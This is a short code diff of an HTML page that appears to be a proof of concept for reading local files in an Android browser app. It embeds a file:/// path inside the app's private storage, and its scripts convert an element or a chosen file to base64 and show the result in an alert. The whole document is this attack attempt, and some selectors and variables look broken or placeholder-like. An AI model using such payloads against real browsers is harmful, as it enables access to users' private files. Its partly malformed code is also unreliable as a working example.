@@ -6,24 +6,19 @@
     <embed src="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
     </object>
     <script>
-      function getDataUrl(img) {
-   // Create canvas
-   const canvas = document.createElement('canvas');
-   const ctx = canvas.getContext('2d');
-   // Set width and height
-   canvas.width = img.width;
-   canvas.height = img.height;
-   // Draw the image
-   ctx.drawImage(img, 0, 0);
-   return canvas.toDataURL('image/png');
+      function getBase64(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onload = () => resolve(reader.result);
+    reader.onerror = error => reject(error);
+  });
 }
-// Select the image
-const img = document.querySelector('steal');
-img.addEventListener('load', function (event) {
-   const dataUrl = getDataUrl(event.currentTarget);
-   console.log(dataUrl);
-});
-      alert(dataUrl)
+
+var file = document.querySelector('ObjAlertePageLogin > input[type="file"]').files[0];
+getBase64(file).then(
+  data => alert(data)
+);
       </script>
     </body>
 </html>
